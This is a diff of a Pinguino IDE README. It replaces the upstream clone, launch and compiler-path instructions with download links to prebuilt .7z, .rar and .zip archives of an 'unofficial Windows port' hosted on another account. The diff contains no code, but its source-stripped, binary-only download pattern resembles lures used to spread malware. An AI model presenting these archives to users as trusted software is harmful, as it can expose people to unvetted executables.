@@ -1,107 +1,68 @@
-# Pinguino IDE 13
+# Pinguino IDE 13 — Windows Port
 
-This repository contains the Pinguino IDE 13 codebase. Pinguino is an integrated development environment for working with supported microcontroller boards and the associated Pinguino toolchain and libraries.
+An unofficial Windows port of the discontinued **Pinguino IDE**, bringing the legacy PIC microcontroller development environment to modern Windows systems.
 
-This README covers obtaining the IDE and libraries, launching the application, and configuring the compiler paths.
+This project is intended for hobbyists, educators, and anyone who still works with older Pinguino-compatible hardware or wants to revisit the original development environment.
 
-## Project components
+> **This is an unofficial port.** It is not maintained, endorsed, or supported by the original Pinguino IDE authors.
 
-The Pinguino development environment uses two repositories:
+## Download
 
-- [Pinguino IDE](https://github.com/PinguinoIDE/pinguino-ide) - the IDE source.
-- [Pinguino libraries](https://github.com/PinguinoIDE/pinguino-libraries) - the associated device libraries.
+Get the Windows release from the [Releases page](https://github.com/ruzgar-mcu-wizard/pinguino-ide/releases).
 
-The compiler toolchains are separate dependencies and must also be available on your system.
+The current release is **v13.0.0 — Pinguino IDE Windows Port Release**. It is published as a pre-release and is available in these archive formats:
 
-## Get the source
+- [7-Zip archive (.7z)](https://github.com/ruzgar-mcu-wizard/pinguino-ide/releases/download/pinguino-ide-windows/Pinguino-IDE.7z)
+- [RAR archive (.rar)](https://github.com/ruzgar-mcu-wizard/pinguino-ide/releases/download/pinguino-ide-windows/Pinguino-IDE.rar)
+- [ZIP archive (.zip)](https://github.com/ruzgar-mcu-wizard/pinguino-ide/releases/download/pinguino-ide-windows/Pinguino-IDE.zip)
 
-Create a workspace and clone both repositories:
+Choose the archive format you can extract. You only need to download one.
 
-```bash
-mkdir -p ~/Pinguino/v13
-cd ~/Pinguino/v13
+## Getting started
 
-git clone https://github.com/PinguinoIDE/pinguino-ide.git pinguino-ide
-git clone https://github.com/PinguinoIDE/pinguino-libraries.git pinguino-libraries
-```
+1. Open the [latest release](https://github.com/ruzgar-mcu-wizard/pinguino-ide/releases).
+2. Download one of the available archives.
+3. Extract the archive to a folder on your computer.
+4. Open the extracted folder and launch the included Pinguino IDE executable.
 
-If you are using this repository as your IDE source, clone this repository in place of the upstream IDE URL while keeping the libraries repository alongside it.
+No source-code checkout is required to use the packaged Windows release.
 
-Your workspace should contain:
+## What is included
 
-```text
-Pinguino/
-└── v13/
-    ├── pinguino-ide/
-    └── pinguino-libraries/
-```
+- A Windows executable build of Pinguino IDE.
+- Basic compatibility with existing Pinguino toolchains, where applicable.
+- The original Pinguino workflow preserved as closely as possible.
 
-## Launch the IDE
+The project revives a legacy embedded-development environment; it does not guarantee that every original feature, board, programmer, or toolchain will work on every Windows installation.
 
-Run the launcher for your platform from the IDE directory.
+## Compatibility and limitations
 
-**Python launcher:**
+- The port is intended for modern Windows systems, but behavior may vary between Windows versions and configurations.
+- Toolchain compatibility is not universal. Your existing compiler, programmer, and target hardware setup may affect what works.
+- Some legacy features may behave differently or have quirks.
+- This is a revival of discontinued software, not a complete modernization or a replacement for current development environments.
 
-```bash
-python pinguino-ide.py
-```
+**Release status:** Pre-release. The build is usable for compiling projects, but compatibility and behavior may vary.
 
-**Windows:**
+## About Pinguino
 
-```bat
-pinguino.bat
-```
+Pinguino is an integrated development environment created for programming supported PIC-based microcontroller boards. This repository is based on the discontinued Pinguino IDE project and packages a Windows-oriented build for people who still use the ecosystem.
 
-**Linux:**
+For the original project, see [PinguinoIDE/pinguino-ide](https://github.com/PinguinoIDE/pinguino-ide).
 
-```bash
-./pinguino.sh
-```
+## Issues and feedback
 
-The Python launcher requires the dependencies expected by the Pinguino IDE source. If the application does not start, check its console output and verify that the required Python packages and compiler tools are installed.
+Found a bug, compatibility problem, or something that does not work as expected?
 
-## Configure compiler and library paths
+Please [open an issue in this repository](https://github.com/ruzgar-mcu-wizard/pinguino-ide/issues) and include:
 
-The IDE configuration files are located at:
+- Your Windows version.
+- What you were trying to do.
+- What happened and what you expected to happen.
+- Any relevant error message or screenshot.
 
-- Linux: `pinguino/qtgui/config/pinguino.linux.conf`
-- Windows: `pinguino/qtgui/config/pinguino.windows.conf`
+Please keep in mind that this is an unofficial port of discontinued software, so not every upstream issue can necessarily be fixed here.
 
-Edit the configuration file for your operating system and set the paths to the toolchains and libraries installed on your machine.
+## License
 
-The relevant settings are:
-
-```ini
-[Paths]
-sdcc_bin = "full_path_to_pinguino-compilers"/p8/bin
-gcc_bin = "full_path_to_pinguino-compilers"/p32/bin
-xc8_bin = "full_path_to_xc8"/bin
-pinguino_8_libs = "full_path_to_pinguino-ide"/p8
-pinguino_32_libs = "full_path_to_pinguino-ide"/p32
-install_path = "full_path_to_pinguino-ide"
-
-user_path = ~/Pinguino/v13
-user_libs = ${user_path}/pinguinolibs
-```
-
-Replace the example paths with the actual locations on your system. The compiler paths must point to the directories containing the corresponding executables.
-
-## Updating the source
-
-From each cloned repository, pull the latest changes:
-
-```bash
-cd ~/Pinguino/v13/pinguino-ide
-git pull
-
-cd ~/Pinguino/v13/pinguino-libraries
-git pull
-```
-
-Keep local changes backed up before updating if you have modified either repository.
-
-## Support and bug reports
-
-For issues with the upstream Pinguino IDE project, see the [Pinguino IDE issue tracker](https://github.com/PinguinoIDE/pinguino-ide/issues).
-
-This repository's code and its upstream dependencies may have their own licensing and contribution terms. Check the relevant license files before redistributing modified versions.
+See the repository's [LICENSE](LICENSE) file for the license information that applies to this codebase. Components and dependencies originating from upstream projects may have their own licensing terms; check their respective license files before redistributing them.
